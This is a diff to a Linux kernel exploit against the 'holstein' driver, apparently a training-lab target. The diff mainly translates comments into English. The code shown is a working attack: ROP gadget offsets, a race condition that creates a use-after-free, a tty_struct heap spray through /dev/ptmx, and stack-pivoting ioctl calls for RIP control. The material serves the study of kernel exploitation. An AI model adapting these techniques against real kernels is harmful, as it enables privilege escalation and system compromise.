@@ -14,7 +14,7 @@ unsigned long kbase, g_buf, current;
 unsigned long user_cs, user_ss, user_rsp, user_rflags;
 
 #define ofs_tty_ops 0xc3afe0
-#define rop_push_rdx_add_prbxP41h_bl_pop_rsp_pop_rbp (kbase + 0x137da6)
+#define rop_push_rdx_add_prbxP41h_bl_pop_rsp_pop_rbp (kbase + 0x137da6) // goal: mov rsp, rdx; ret;
 #define rop_pop_rdi (kbase + 0x0b13c5)
 #define rop_pop_rcx_rbx_rbp (kbase + 0x3006fc)
 #define rop_mov_rdi_rax_rep_movsq (kbase + 0x65094b)
@@ -60,7 +60,7 @@ void* race(void *arg) {
 
   while (1) {
     // Race until fd is 4 in any thread. Note that file descriptors are shared
-    // among threads.
+    // among threads
     while (!race_win) {
       int fd = open("/dev/holstein", O_RDWR);
       if (fd == fd2) race_win = 1;
@@ -97,19 +97,23 @@ void* spray_thread(void *arg) {
     // tty_structのspray
     spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
     if (spray[i] == -1) {
+      // Reached the maximum number of opened file descriptors without hitting
+      // our freed buffer. Clean up and return failure
       for (int j = 0; j < i; j++)
         close(spray[j]);
       return (void*)-1;
     }
 
     if (read(fd2, &x, sizeof(long)) == sizeof(long) && x) {
-      // ヒット
+      // The buffer has been used for the new tty_struct, which will be our
+      // victim. Close all previously opened file descriptors
       for (int j = 0; j < i; j++)
         close(spray[j]);
       return (void*)spray[i];
     }
   }
 
+  // No success. Clean up and return failure
   for (int i = 0; i < 800; i++)
     close(spray[i]);
   return (void*)-1;
@@ -145,12 +149,11 @@ int create_overlapped() {
     puts("[-] Bad luck!");
     exit(1);
   }
-  // Leave it blank as it will be used later to determine the success of the
-  // spray
+  // Blank the buffer as it will be used determine the success of the spray
   memset(buf, 0, 14);
   write(fd1, buf, 14);
 
-  // Use-after-Freeの作成
+  // Free the buffer to create the use-after-free opportunity
   close(fd1);
 
   // Heap Spray on multiple cores
@@ -220,7 +223,7 @@ int main() {
   write(fd2, buf, 0x20);
 
   // RIP control
-  ioctl(victim_ptmx, 0, g_buf - 8); // rsp=rdx; pop rbp;
+  ioctl(victim_ptmx, 0, /* rdx */ g_buf - 8); // rsp=rdx; pop rbp;
   puts("[-] Exploit failed...");
 
   return 0;
